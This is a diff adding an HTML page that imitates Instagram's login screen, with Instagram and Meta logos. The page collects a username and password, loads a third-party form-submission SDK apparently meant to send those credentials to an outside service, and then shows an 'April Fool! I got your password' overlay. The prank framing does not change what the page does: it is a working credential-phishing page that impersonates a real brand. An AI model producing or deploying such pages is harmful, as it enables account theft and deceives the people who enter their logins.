@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Clone</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div id="splash-screen">
+        <div class="splash-content">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Logo">
+        </div>
+        <div class="splash-footer">
+            <p>from</p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
+            <span>Meta</span>
+        </div>
+    </div>
+
+    <div class="login-container">
+        <div class="language-selector">
+            English (US) <span>&#8964;</span>
+        </div>
+
+        <div class="logo-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
+        </div>
+
+        <form id="login-form">
+    <input type="text" name="fi-sender-username" placeholder="Username, email or mobile number" required>
+    <input type="password" name="fi-text-password" placeholder="Password" required>
+    <button type="submit" class="btn-login" id="login-btn">Log in</button>
+</form>
+<div id="prank-overlay" style="display: none;">
+    <div class="prank-content">
+        <h1>April Fool! 😜</h1>
+        <p>I got your password... </p>
+        <button onclick="location.reload()" class="btn-login">Go Back</button>
+    </div>
+</div>
+
+        <a href="#" class="forgot-password">Forgot password?</a>
+
+        <div class="footer-actions">
+            <button class="btn-create">Create new account</button>
+            <div class="meta-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta Logo">
+                <span>Meta</span>
+            </div>
+        </div>
+    </div>
+    <script src="https://forminit.com/sdk/v1/forminit.js"></script>
+    
+    <script src="script.js"></script>
+    <script>
+  const fi = new Forminit();
+</script>
+</body>
+</html>
